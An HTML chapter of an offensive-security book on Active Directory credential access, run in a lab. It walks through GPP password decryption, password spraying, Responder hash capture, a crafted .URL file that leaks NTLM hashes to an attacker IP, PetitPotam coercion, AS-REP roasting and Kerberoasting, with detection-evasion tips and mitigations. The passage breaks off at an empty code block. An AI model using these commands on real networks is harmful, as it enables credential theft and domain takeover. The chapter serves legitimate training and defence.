<html><head></head><body>
<div id="sbo-rt-content"><div id="_idContainer091">
<h1 class="chapter-number" id="_idParaDest-61"><a id="_idTextAnchor061"/>4</h1>
<h1 id="_idParaDest-62"><a id="_idTextAnchor062"/>Credential Access in Domain</h1>
<p>It was difficult to choose the order of <em class="italic">Chapters 4</em>, <em class="italic">5</em> and <em class="italic">6</em>, as they are all closely interconnected. We are not going to cover how to dump secrets from the host (LSASS, DPAPI, Credential Manager, etc.). Instead, we will keep our focus on Active Directory. This chapter starts with discussing ways to obtain credentials in clear text in the domain. Then, we will explore various techniques to capture the hash, such as forced authentication and poisoning. Relay will be covered later in <a href="B18964_05.xhtml#_idTextAnchor093"><span class="No-Break"><em class="italic">Chapter 5</em></span></a>, <em class="italic">Lateral Movement</em>. After that will be an introduction to the Kerberos authentication protocol and different styles of roasting the three-headed dog. Finally, we will discuss native security mechanisms for password management, such<a id="_idIndexMarker190"/> as <strong class="bold">Local Administrator Password Solution</strong> (<strong class="bold">LAPS</strong>) and <strong class="bold">Group Managed Service Account</strong> (<strong class="bold">gMSA</strong>), and ways to recover privileged credentials from them. As a final note, the DCSync attack <a id="_idIndexMarker191"/>together with ways to dump hashes from the ntds.dit domain controller will <span class="No-Break">be explained.</span></p>
<p>In this chapter, we are going to cover the following <span class="No-Break">main topics:</span></p>
<ul>
<li>Clear-text credentials in <span class="No-Break">the domain</span></li>
<li>Capture <span class="No-Break">the hash</span></li>
<li><span class="No-Break">Forced authentication</span></li>
<li>Ways to <span class="No-Break">roast Kerberos</span></li>
<li>Automatic password management in the domain (LAPS <span class="No-Break">or gMSA)</span></li>
<li>DCSync attack and NTDS <span class="No-Break">credentials exfiltration</span></li>
</ul>
<h1 id="_idParaDest-63"><a id="_idTextAnchor063"/>Technical requirements</h1>
<p>In this chapter, you will need to have access to <span class="No-Break">the following:</span></p>
<ul>
<li>VMware Workstation or Oracle VirtualBox with at least 16 GB of RAM, eight CPU cores, and at least 55 GB of total space (more if you <span class="No-Break">take snapshots)</span></li>
<li>A Linux-based operating system is <span class="No-Break">strongly recommended</span></li>
<li>Vagrant installed with the plugin for the corresponding virtualization platform <span class="No-Break">and Ansible</span></li>
<li>From the GOADv2 project, we will use DC02, DC03, SRV02, <span class="No-Break">and SRV03</span></li>
</ul>
<h1 id="_idParaDest-64"><a id="_idTextAnchor064"/>Clear-text credentials in the domain</h1>
<p>In<a id="_idIndexMarker192"/> this section, we will discuss different ways to obtain credentials in clear text. However, we will not touch on things such as the <strong class="source-inline">password.txt</strong> file left on the share, the default set of credentials for some applications, and pushing the <strong class="source-inline">WDigest</strong> parameter so a password can be dumped <a id="_idIndexMarker193"/>in clear text from memory. We also will not discuss Internal Monologue attack[1] that allows to obtain credentials without touching LSASS[1]. Our focus is solely on Active Directory. We may find a very old pre-Windows 2000 computer in the domain or the domain may be vulnerable to MS14-025 with the local administrator password encrypted in a Group Policy file. We can try our luck with password spraying or by searching for a password in an Active Directory user’s <span class="No-Break">comment field.</span></p>
<h2 id="_idParaDest-65"><a id="_idTextAnchor065"/>Old, but still worth trying</h2>
<p>Recently, I came across some intriguing research published by <em class="italic">Oddvar Moe</em> regarding pre-created computer accounts[2]. Apparently, checking the <strong class="bold">Assign this computer account as a pre-Windows 2000 computer</strong> field will turn the password for the computer account into the same as the computer name. This is the case when the computer account was manually created by the administrator and has never been used in the domain. To find such accounts, we look for the <strong class="source-inline">UserAccountControl</strong> flag value equaling <strong class="source-inline">4128</strong>. Then, we can extract a list of computers and try to log in using <strong class="source-inline">CrackMapExec</strong>. The <strong class="bold">STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</strong> error message will flag that the guessed password for the computer account is correct. We need to change the password before we can use the computer account. It can be done with<a id="_idIndexMarker194"/> various tools, such <a id="_idIndexMarker195"/>as <strong class="source-inline">kpasswd.py</strong> or <strong class="source-inline">rpcchangepwd.py</strong>. Note that using Kerberos authentication will take away your need to change the password for the computer account. This behavior was discovered by <em class="italic">Filip </em><span class="No-Break"><em class="italic">Dragovic: </em></span><span class="No-Break">https://twitter.com/filip_dragovic/status/1524730451826511872</span><span class="No-Break">.</span></p>
<p><strong class="bold">Group Policy Preferences</strong> (<strong class="bold">GPP</strong>) were introduced<a id="_idIndexMarker196"/> in Windows 2008 R2 to help system administrators with various configuration changes. The most dangerous one was the ability to set the local administrator’s password on domain machines. The problem was that the password was stored in an XML file that every authenticated user could read in <strong class="source-inline">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</strong>. While the password was encrypted using the AES-256 key, Microsoft published the private key on MSDN, effectively making encryption useless. A good blog post by <em class="italic">Sean Metcalf</em> with a deeper explanation is available[3]. The attack comprises essentially two commands – one line by <em class="italic">Oddvar Moe</em> to search for the value and a Linux one-liner by <em class="italic">0x00C651E0</em> to decrypt <span class="No-Break">the password:</span></p>
<pre class="console">
findstr /S /I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml
echo 'password_in_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000</pre> <p>Other tools, such <a id="_idIndexMarker197"/>as <strong class="source-inline">Gpp-Decrypt</strong> and the Metasploit <strong class="source-inline">post/windows/gather/credentials/gpp</strong> module, are available as well. After the patch, this functionality was completely removed from GPP <span class="No-Break">by Microsoft.</span></p>
<h2 id="_idParaDest-66"><a id="_idTextAnchor066"/>Password in the description field</h2>
<p>During the enumeration, we may be lucky and find<a id="_idIndexMarker198"/> the password in the description field of the user profile in Active Directory. An example is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer066">
<img alt="" height="188" role="presentation" src="image/B18964_04_01.jpg" width="789"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.1 – Password in the description field</p>
<p>Even if there is no <a id="_idIndexMarker199"/>password in the description field, it is a good idea to examine it, as we may find useful information about the account’s purpose, instructions to the IT staff, and other valuable bits. However, such an account can be <span class="No-Break">a honeypot.</span></p>
<h2 id="_idParaDest-67"><a id="_idTextAnchor067"/>Password spray</h2>
<p>Another way we can try to guess the<a id="_idIndexMarker200"/> correct set of credentials is with a password spray. There are different approaches we can take; for example, try the username as the password. Before starting, it is very important to review the password policy to avoid a lockout. If <strong class="source-inline">NULL</strong> session binding is not allowed, we need a set of valid credentials to pull the <a id="_idIndexMarker201"/>password policy. We can do it with the help of an amazing tool – <span class="No-Break"><strong class="bold">CrackMapExec</strong></span><span class="No-Break">[4]:</span></p>
<pre class="console">
crackmapexec smb 192.168.56.0/24 -u jeor.mormont -p '_L0ngCl@w_' --pass-pol</pre> <p>The result of the command is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer067">
<img alt="" height="843" role="presentation" src="image/B18964_04_02.jpg" width="1359"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.2 – Password policy enumeration</p>
<p>There are various PowerShell commands we can use to pull the policy, such as <strong class="source-inline">Get-DomainPolicyData</strong> from PowerView or the native <strong class="source-inline">Get-ADDefaultDomainPasswordPolicy</strong> command from the Active <span class="No-Break">Directory module.</span></p>
<p>Now that we know the password policy and lockout rules and hopefully have a list of the users, we can start our spray. CrackMapExec provides different options for performing a spray, for example, using lists, one-to-one matches, and wordlists. Let’s try to perform a spray where the username is the same as the password. We can run a command where we try to log in to all machines in the subnet over SMB (it is very loud and not <span class="No-Break">OpSec safe):</span></p>
<pre class="console">
crackmapexec smb 192.168.56.0/24 -u user.txt -p user.txt --no-bruteforce --continue-on-success</pre> <p>The output of the previous command is <a id="_idIndexMarker202"/>shown in the following screenshot (user <strong class="source-inline">hodor</strong> has <span class="No-Break">password </span><span class="No-Break"><strong class="source-inline">hodor</strong></span><span class="No-Break">):</span></p>
<div>
<div class="IMG---Figure" id="_idContainer068">
<img alt="" height="470" role="presentation" src="image/B18964_04_03.jpg" width="1362"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.3 – Successful password spray</p>
<p>There are other tools that<a id="_idIndexMarker203"/> can be used for a spray, such <a id="_idIndexMarker204"/>as <strong class="bold">kerbrute</strong>[5] by <em class="italic">ropnop</em> and <strong class="bold">DomainPasswordSpray</strong>[6] <span class="No-Break">by </span><span class="No-Break"><em class="italic">dafthack</em></span><span class="No-Break">.</span></p>
<p>Before performing a spray, it is important to carefully enumerate domain users, in order not to trigger possible decoy accounts. Also, wisely choose the interval between sprays, as a large number of failed login attempts (event ID 4625) will trigger <span class="No-Break">an investigation.</span></p>
<p>In the next section, we will cover how to capture the hash and avoid confusion <span class="No-Break">in terminology.</span></p>
<h1 id="_idParaDest-68"><a id="_idTextAnchor068"/>Capture the hash</h1>
<p>This section will be focused on<a id="_idIndexMarker205"/> capturing the hash, the number-one step in a well-known attack: NTLM relay. As an introduction to this theme, I highly encourage you to read the most comprehensive guide about <span class="No-Break">this attack[7].</span></p>
<p>Firstly, we need to cover a bit of a theory. The NTLM authentication protocol<a id="_idIndexMarker206"/> is used for network authentication and has two versions. It uses <a id="_idIndexMarker207"/>a <em class="italic">zero-knowledge proof</em> concept, meaning that credentials have never been transmitted over the network. It uses a challenge-response scheme, where the server sends a random set of data and client responses with a value, which is a result of hashing this data together with some extra parameters and the client’s secret key. As an attacker, we are interested in capturing this valid NTLM response from the client. Next, we can try to crack the hash or <span class="No-Break">relay it.</span></p>
<p>NTLMv1 is deprecated and not considered secure. However, it is possible to see NTLMv1 in use in older <a id="_idIndexMarker208"/>environments. There are two techniques to<a id="_idIndexMarker209"/> capture the hash: <strong class="bold">Man in the Middle</strong> (<strong class="bold">MITM</strong>) and <span class="No-Break"><strong class="bold">coerced authentication</strong></span><span class="No-Break">.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">I recommend you refer to this resource if anything is not clear in the following <span class="No-Break">text: </span><a href="https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications"><span class="No-Break">https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications</span></a><span class="No-Break">.</span></p>
<p>Let us start with <span class="No-Break">network-related attacks:</span></p>
<ul>
<li><strong class="bold">ARP poisoning</strong> is possible when an attacker is sitting between the client and the server. The success ratio of this attack depends on the network topology and hardening. Also, it <a id="_idIndexMarker210"/>can cause severe <span class="No-Break">network disruptions.</span></li>
<li><strong class="bold">DNS spoofing</strong> requires <a id="_idIndexMarker211"/>the attacker to introduce a malicious DNS server in the network for the clients via ARP/DHCPv6 spoofing. Then, the attacker can reply to the received <span class="No-Break">client’s requests.</span></li>
<li><strong class="bold">DHCP poisoning</strong> happens by injecting a malicious WPAD or DNS server address into the client’s <a id="_idIndexMarker212"/>DHCP reply. The client’s request for <strong class="source-inline">wpad.dat</strong> will trigger a malicious server to <span class="No-Break">request authentication.</span></li>
<li><strong class="bold">DHCPv6 spoofing</strong> is possible<a id="_idIndexMarker213"/> because IPv6 in Windows has higher priority than IPv4 and it is a multicast protocol. The attacker can provide the client with a malicious config and proceed with DNS <span class="No-Break">spoofing later.</span></li>
<li><strong class="bold">Local-Link Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS), and Multicast Domain Name System (mDNS) spoofing</strong> are possible because <a id="_idIndexMarker214"/>of multicast name <a id="_idIndexMarker215"/>resolution protocols used in Windows <a id="_idIndexMarker216"/>environments. If DNS fails, these protocols will be used for resolution as a fallback option. The attacker can answer queries and then ask the client <span class="No-Break">to authenticate.</span></li>
<li><strong class="bold">WSUS spoofing</strong> requires <a id="_idIndexMarker217"/>ARP poisoning and an evil WSUS server to deploy malicious updates to <span class="No-Break">the clients.</span></li>
<li><strong class="bold">ADIDNS poisoning</strong> is an <a id="_idIndexMarker218"/>attack on Active Directory-integrated DNS. The idea is to inject malicious <span class="No-Break">DDNS records.</span></li>
<li><strong class="bold">WPAD spoofing</strong> abuses the <a id="_idIndexMarker219"/>feature of helping clients locate proxy configuration scripts. After the MS16-077 security update, this attack is only possible through ADIDNS or <span class="No-Break">DHCPv6 spoofing.</span></li>
</ul>
<p>If the NTLMv1<a id="_idIndexMarker220"/> protocol is allowed in the network, we can try to downgrade the authentication to obtain the NTLMv1 response. It uses weak DES encryption. We add a magical challenge value (<strong class="source-inline">1122334455667788</strong>) to the <strong class="bold">Responder’s</strong>[8] configuration file (<strong class="source-inline">/etc/responder/Responder.conf</strong>) and <span class="No-Break">start it:</span></p>
<pre class="console">
sudo responder -I eth1 –-lm --disable-ess</pre> <p>In our lab, we do not have NTLMv1 enabled; however, after spinning up Responder, in a few minutes, we captured the NTLMv2 response for <span class="No-Break">user </span><span class="No-Break"><strong class="source-inline">eddard.stark</strong></span><span class="No-Break">:</span></p>
<pre class="console">
sudo responder -I eth1</pre> <div>
<div class="IMG---Figure" id="_idContainer069">
<img alt="" height="223" role="presentation" src="image/B18964_04_04.jpg" width="908"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.4 – Capturing the NTLMv2 response</p>
<p>To simulate this activity, the lab author created a scheduled task on <strong class="source-inline">winterfell</strong> as the user <strong class="source-inline">eddard.stark</strong> is trying to connect over SMB to the server by DNS name with a typo. As the DNS server cannot resolve the name, broadcast protocols kicked in and we captured the <span class="No-Break">NTLMv2 response.</span></p>
<p>To mitigate such capturing possibilities, ideally, we need to stop using NTLM. If this is not possible (as is often the case), a strong password policy and strict hardening on the network level should be applied. The idea is to disable all unnecessary multicasting protocols and NTLMv1 (in Group Policy, set <strong class="bold">LAN Manager</strong> to <strong class="source-inline">Send NTLMv2 responses only. Refuse LM &amp; NTLM</strong>). We will provide recommendations for mitigating relay in the <span class="No-Break">next chapter.</span></p>
<p>But what if these network protocols are disabled and MITM is not really an option? There are a few ways we can force the client to authenticate to us. Recently, some intriguing research was published by <em class="italic">MDSec</em>[9]. There are certain types of files that we can put on the writable share and Windows will automatically authenticate and send an NTLM response to a remote machine: <strong class="source-inline">SCF,</strong> <strong class="source-inline">URL</strong>, <strong class="source-inline">library-ms</strong>, and <strong class="source-inline">searchConnector-ms</strong>. An <a id="_idIndexMarker221"/>important remark is that the attacker’s machine should be within the local intranet zone, meaning that the network connection can be established by using a UNC path. The idea in the research was to use a WebDAV-enabled HTTP server to collect hashes, which is called <strong class="source-inline">farmer</strong>, and the tool to create files is called <strong class="source-inline">crop</strong>. The following two commands will capture <span class="No-Break">the hash:</span></p>
<pre class="console">
farmer.exe 8888 120
crop.exe \\castelblack\public legit.url \\winterfell@8888\legit.ico</pre> <p>We can also create a .URL file manually. The idea is that we put an environment variable in the file, so Explorer on the victim’s machine when viewing the folder will proactively look up this variable before sending the request, effectively connecting to our file share without any user interaction. This behavior allows us to catch the NTLMv2 response with Responder. The URL file content could look <span class="No-Break">like this:</span></p>
<pre class="console">
[InternetShortcut]
URL=any
WorkingDirectory=any
IconFile=\\192.168.56.100\%USERNAME%.icon
IconIndex=1</pre> <p>The result can be <a id="_idIndexMarker222"/>seen as follows in Responder when <strong class="source-inline">jon.snow</strong> opens a publicly <span class="No-Break">shared folder:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer070">
<img alt="" height="241" role="presentation" src="image/B18964_04_05.jpg" width="909"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.5 – NTLMv2 response capture after opening a pu<a id="_idTextAnchor069"/>blic share with a .URL file</p>
<p class="callout-heading">Note</p>
<p class="callout">Other interesting places to steal NTLMv2 responses are thoroughly described in this blog post by <em class="italic">Osanda </em><span class="No-Break"><em class="italic">Malith</em></span><span class="No-Break">: </span><span class="No-Break">https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/</span><span class="No-Break">.</span></p>
<p>To prevent forced authentication of the file types mentioned previously, we need to turn off the display of thumbnails on network folders via the Group Policy setting. Next, we will cover another powerful technique to capture the hash, if all previous attempts were <span class="No-Break">not successful.</span></p>
<h1 id="_idParaDest-69"><a id="_idTextAnchor070"/>Forced authentication</h1>
<p>We have covered MITM capabilities and now <a id="_idIndexMarker223"/>will discuss in detail various ways to force authentication. The idea is that a standard user can force the target machine account (usually a domain controller) to connect to an arbitrary target. This is made possible through an automatic authentication attempt. You can find a repository with 15 known methods in 5 protocols[10]. Now, let’s dive a bit deeper into <span class="No-Break">each method.</span></p>
<h2 id="_idParaDest-70"><a id="_idTextAnchor071"/>MS-RPRN abuse (PrinterBug)</h2>
<p>This is a <em class="italic">won’t-fix</em> bug, which is <a id="_idIndexMarker224"/>enabled by default in every Windows<a id="_idIndexMarker225"/> environment. The idea is that by using a domain username and password, the attacker can trigger the <strong class="source-inline">RpcRemoteFindFirstPrinterChangeNotificationEx</strong> method and force authentication over SMB. We will demonstrate this attack later when discussing <a id="_idIndexMarker226"/>Kerberos’s unconstrained delegation in <a href="B18964_05.xhtml#_idTextAnchor093"><span class="No-Break"><em class="italic">Chapter 5</em></span></a>. A go-to tool for this abuse is called <strong class="source-inline">SpoolSample</strong>[11] and can be found <span class="No-Break">on GitHub.</span></p>
<h2 id="_idParaDest-71"><a id="_idTextAnchor072"/>MS-EFSR abuse (PetitPotam)</h2>
<p>The <strong class="bold">Encrypting File System Remote</strong> (<strong class="bold">EFSR</strong>) protocol<a id="_idIndexMarker227"/> can be <a id="_idIndexMarker228"/>abused via a number of RPC calls, such <a id="_idIndexMarker229"/>as <strong class="source-inline">EfsRpcOpenFileRaw</strong>, to coerce Windows hosts to authenticate to other machines. This RPC interface is available through different SMB pipes, including those discussed in <a href="B18964_03.xhtml#_idTextAnchor040"><span class="No-Break"><em class="italic">Chapter 3</em></span></a>, <strong class="source-inline">\pipe\samr</strong> and <strong class="source-inline">\pipe\lsarpc</strong>. To demonstrate this attack, we will use this proof <span class="No-Break">of concept[12].</span></p>
<p>We will run this command on <strong class="source-inline">castelblack</strong> with the attacker and domain controller <span class="No-Break">IP addresses:</span></p>
<pre class="console">
PetitPotam.exe 192.168.56.100 192.168.56.11 1</pre> <p>We will catch the domain controller’s hash <span class="No-Break">with Responder:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer071">
<img alt="" height="244" role="presentation" src="image/B18964_04_06.jpg" width="910"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.6 – PetitPotam coerced authentication successful</p>
<p>In <a href="B18964_08.xhtml#_idTextAnchor163"><span class="No-Break"><em class="italic">Chapter 8</em></span></a>, we will show how the<a id="_idIndexMarker230"/> domain controller’s <a id="_idIndexMarker231"/>hash can be relayed to the server running Active Directory Certificate Services, effectively allowing us to compromise the <span class="No-Break">whole domain.</span></p>
<h2 id="_idParaDest-72"><a id="_idTextAnchor073"/>WebDAV abuse</h2>
<p>The idea behind <a id="_idIndexMarker232"/>WebDAV abuse<a id="_idIndexMarker233"/> is to find machines running this service in the domain. The <strong class="source-inline">WebclientServiceScanner</strong>[13] tool can help with such a task. If no clients have the <strong class="source-inline">WebClient</strong> service running, it can be enabled remotely via the <strong class="source-inline">searchConnector-ms</strong> file[14]. Then, we can use <strong class="source-inline">PetitPotam</strong> from <a id="_idIndexMarker234"/>previously, combined with <strong class="bold">Resource-Based Constrained Delegation</strong> (<strong class="bold">RBCD</strong>) abuse. We will discuss RBCD abuse in the Kerberos section of <a href="B18964_05.xhtml#_idTextAnchor093"><span class="No-Break"><em class="italic">Chapter 5</em></span></a><span class="No-Break">.</span></p>
<h2 id="_idParaDest-73"><a id="_idTextAnchor074"/>MS-FSRVP abuse (ShadowCoerce)</h2>
<p><strong class="bold">Microsoft’s File Server Remote VSS Protocol</strong> (<strong class="bold">MS-FSRVP</strong>) is used to make shadow copies on the remote <a id="_idIndexMarker235"/>computer. Two<a id="_idIndexMarker236"/> methods are supported. Invocation is possible through an SMB <a id="_idIndexMarker237"/>named pipe. An attack is not possible if <strong class="bold">File Server VSS Agent Service</strong> is not enabled on the target machine. Also, patch KB5014692 prevents coercion attacks. I was able to run a proof of concept[15] but did not manage to get the NTLMv2 response on Windows Server 2019 (c<strong class="source-inline">astelblack</strong>). The result of the coercion attempt is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer072">
<img alt="" height="148" role="presentation" src="image/B18964_04_07.jpg" width="726"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.7 — ShadowCoerce running</p>
<p>The next method also requires a service to be up and running on the <span class="No-Break">target machine.</span></p>
<h2 id="_idParaDest-74"><a id="_idTextAnchor075"/>MS-DFSNM abuse (DFSCoerce)</h2>
<p>The same as other <a id="_idIndexMarker238"/>coerce methods, this one uses the RPC interface available through an SMB named pipe (<strong class="source-inline">\pipe\netdfs</strong>) in Microsoft’s Distributed<a id="_idIndexMarker239"/> File System Namespace Management protocol. <em class="italic">Filip Dragovic</em> found two methods (<strong class="source-inline">NetrDfsAddStdRoot</strong> and <strong class="source-inline">NetrDfsRemoveStdRoot</strong>) that can be used to force authentication. The proof-of-concept code was published on GitHub[16]. Simply run the command against only the domain controller with <span class="No-Break">DFS running.</span></p>
<p>The next section will cover another authentication protocol – Kerberos. Understanding the mechanisms and workflow of the protocol is crucial for understanding material further in <span class="No-Break">the book.</span></p>
<h1 id="_idParaDest-75"><a id="_idTextAnchor076"/>Roasting the three-headed dog</h1>
<p>It was inevitable that we would reach a point where we must discuss and understand Kerberos. This authentication protocol was built to access services in the network by presenting a <span class="No-Break">valid ticket.</span></p>
<h2 id="_idParaDest-76"><a id="_idTextAnchor077"/>Kerberos 101</h2>
<p>We need a bit more of an understanding of how <a id="_idIndexMarker240"/>the protocol works before we can discuss the attack venues available for us. As a good starting point, I can recommend the blog post <span class="No-Break">by </span><span class="No-Break"><em class="italic">hackndo</em></span><span class="No-Break">[17]</span></p>
<p>We have three main subjects – the client, service, and <strong class="bold">Key Distribution Center</strong> (<strong class="bold">KDC</strong>), which is <a id="_idIndexMarker241"/>the domain controller. The following diagram[18], which was published on the Microsoft website, explains how<a id="_idIndexMarker242"/> <span class="No-Break">it works:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer073">
<img alt="" height="376" role="presentation" src="image/B18964_04_08.jpg" width="518"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.8 – Kerberos in a nutshell</p>
<p>Now let follow the authentication process in more <span class="No-Break">details step-by-step.</span></p>
<ol>
<li><strong class="bold">KRB_AS_REQ</strong> (<strong class="bold">Kerberos Authentication Service Request</strong>) is sent by the client to <a id="_idIndexMarker243"/>KDC and contains various information, most importantly, a timestamp that is encrypted with the hashed version of the password. If the client exists, then KDC will try to decrypt the timestamp by using the received hash of the client’s password. If everything goes smoothly, the session key will <span class="No-Break">be generated.</span></li>
<li><strong class="bold">KRB_AS_REP</strong> (<strong class="bold">Kerberos Authentication Service Reply</strong>) will contain a <strong class="bold">Ticket-Granting Ticket</strong> (<strong class="bold">TGT</strong>), which is <a id="_idIndexMarker244"/>encrypted <a id="_idIndexMarker245"/>by the client’s password hash session key, the validity period, and other information. It is encrypted by the KDC key, so only the domain controller can read <span class="No-Break">this ticket.</span></li>
<li><strong class="bold">KRB_TGS_REQ</strong> (<strong class="bold">Kerberos Ticket Granting Service Request</strong>) is sent by the client when it wants to use a service. It <a id="_idIndexMarker246"/>contains the TGT, the service, and an authenticator. The authenticator is encrypted by the session key from <em class="italic">step 2</em> and contains the username and timestamp. If the session key from the TGT successfully decrypted the authenticator and the data matches, then authentication <span class="No-Break">is successful.</span></li>
<li><strong class="bold">KRB_TGS_REP</strong> (<strong class="bold">Kerberos Ticket Granting Service Reply</strong>) will contain the requested service name, client’s<a id="_idIndexMarker247"/> name, and session key for the service and client. The ticket is encrypted with the service’s key and with the session key from <em class="italic">step 2</em>. Effectively, the client will decrypt the ticket and extract a new session key and ticket to communicate with <span class="No-Break">the service.</span></li>
<li><strong class="bold">KRB_AP_REQ</strong> (<strong class="bold">Kerberos Application Request</strong>) is sent by the client with a new authenticator and TGS. The <a id="_idIndexMarker248"/>authenticator is encrypted with the session key inside TGS. Verification is like in <span class="No-Break"><em class="italic">step 2</em></span><span class="No-Break">.</span></li>
</ol>
<p>Now, we will discuss how things can go wrong here. The following attacks are quite easy to perform, but we need to be OpSec aware when <span class="No-Break">performing them.</span></p>
<h2 id="_idParaDest-77"><a id="_idTextAnchor078"/>ASREQRoast</h2>
<p>We will start with an<a id="_idIndexMarker249"/> attack that does not abuse any misconfiguration of the protocol and requires a powerful MITM attack. The idea is to intercept the KRB_AS_REQ packet and attempt to crack the hash of the user’s password. This hash is used to encrypt the timestamp in the pre-authentication stage. You can read the original research that covers this attack in detail[19]. In essence, we should have the MITM position; we passively collect the traffic and then use a tool such<a id="_idIndexMarker250"/> as <strong class="bold">Pcredz</strong>[20] to extract hashes that we can try to crack later with hashcat[21]. The main caveat in this attack is the requirement to obtain the <span class="No-Break">MITM position.</span></p>
<h2 id="_idParaDest-78"><a id="_idTextAnchor079"/>KRB_AS_REP roasting (ASREPRoast)</h2>
<p>This attack is possible when there is a <a id="_idIndexMarker251"/>misconfiguration made in Active Directory by enabling <strong class="bold">Do not require Kerberos preauthentication</strong>. This can be seen in the user <span class="No-Break">object properties:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer074">
<img alt="" height="534" role="presentation" src="image/B18964_04_09.jpg" width="407"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.9 – User with pre-authentication enabled</p>
<p>For the attack <a id="_idIndexMarker252"/>execution, we will use Rubeus[22]. But before<a id="_idIndexMarker253"/> typing commands, we need to discuss some OpSec considerations. We know from the documentation that Rubeus will find all misconfigured accounts and try to roast them. This will create a security event on the domain controller with <em class="italic">ID=4768</em> and certain values (<strong class="source-inline">Ticket Encryption Type 0x17, Pre-Authentication </strong><span class="No-Break"><strong class="source-inline">Type: 0</strong></span><span class="No-Break">):</span></p>
<div>
<div class="IMG---Figure" id="_idContainer075">
<img alt="" height="462" role="presentation" src="image/B18964_04_10.jpg" width="586"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.10 – ASREPRoasting detected</p>
<p>A much better way is to pull the list of misconfigured accounts first, do a bit more reconnaissance (i.e., checking for honeypot accounts), and then roast them. We can use PowerView <span class="No-Break">for this:</span></p>
<pre class="console">
Get-DomainUser -PreauthNotRequired -verbose</pre> <p>The LDAP search filter and output are shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer076">
<img alt="" height="569" role="presentation" src="image/B18964_04_11.jpg" width="699"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.11 – List of users vulnerable to AS-REP roasting</p>
<p>Now, we can <a id="_idIndexMarker254"/>run the <span class="No-Break">following command:</span></p>
<pre class="console">
Rubeus.exe asreproast /user:brandon.stark</pre> <p>The output is as shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer077">
<img alt="" height="476" role="presentation" src="image/B18964_04_12.jpg" width="837"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.12 – Hash ready for cracking</p>
<p>We can use <strong class="source-inline">john</strong> (<strong class="source-inline">--format=krb5asrep</strong>) or <strong class="source-inline">hashcat</strong> (<strong class="source-inline">-m 18200</strong>) to crack <span class="No-Break">the hash.</span></p>
<p>To mitigate <a id="_idIndexMarker255"/>this attack, we can try the <span class="No-Break">following measures:</span></p>
<ul>
<li>By default, pre-authentication is enabled, so check why it was disabled for <span class="No-Break">certain accounts</span></li>
<li>Apply additional password complexity requirements for accounts with <span class="No-Break">disabled pre-authentication</span></li>
<li>Ensure that only privileged users can change the <span class="No-Break">pre-authentication attribute</span></li>
<li>Monitor events for changing the pre-authentication attribute (ID 4738 and <span class="No-Break">ID 5136)</span></li>
<li>Monitor for roasting attempts (ID 4768 and <span class="No-Break">ID 4625)</span></li>
</ul>
<h2 id="_idParaDest-79"><a id="_idTextAnchor080"/>Kerberoasting</h2>
<p>The idea<a id="_idIndexMarker256"/> behind this attack is to request <a id="_idIndexMarker257"/>a <strong class="bold">Service Ticket</strong> (<strong class="bold">ST</strong>) and crack the hash to obtain the service account’s password. To be able to request the ST, we need to be authenticated in the domain (possess a valid TGT) and know the <strong class="bold">Service Principal Name</strong> (<strong class="bold">SPN</strong>). The<a id="_idIndexMarker258"/> SPN is a unique service name in the forest. In most cases, services run under machine accounts that have long and complex passwords. But if a service account has a manually set password and SPN, we can try <span class="No-Break">our luck.</span></p>
<p>There is an outstanding blog post that covers Kerberoasting and OpSec in detail with examples[23]. We will cover the material from there, but the original research is an <span class="No-Break">absolute must-read.</span></p>
<p>In general, the strategy stays the same – find accounts with an SPN and roast them. Possible OpSec failures that can happen during AS-REP roasting are also relevant here as well as <span class="No-Break">the following:</span></p>
<ul>
<li>Too-wide LDAP <span class="No-Break">search filter</span></li>
<li>Multiple STs requested in a short period of time (security events with ID 4769), including for <span class="No-Break">honeypot accounts</span></li>
<li>Requesting STs with <span class="No-Break">encryption downgrade</span></li>
</ul>
<p>Now, we will discuss how to avoid a failure step by step. Enumeration is the key to success here. Depending on the size of the forest, we can run general LDAP searches with a focus on collecting information that will help us to choose the right target. In our lab, our initial enumeration can be done by filtering users, excluding <strong class="source-inline">krbtgt</strong> and <span class="No-Break">disabled ones:</span></p>
<pre class="console">
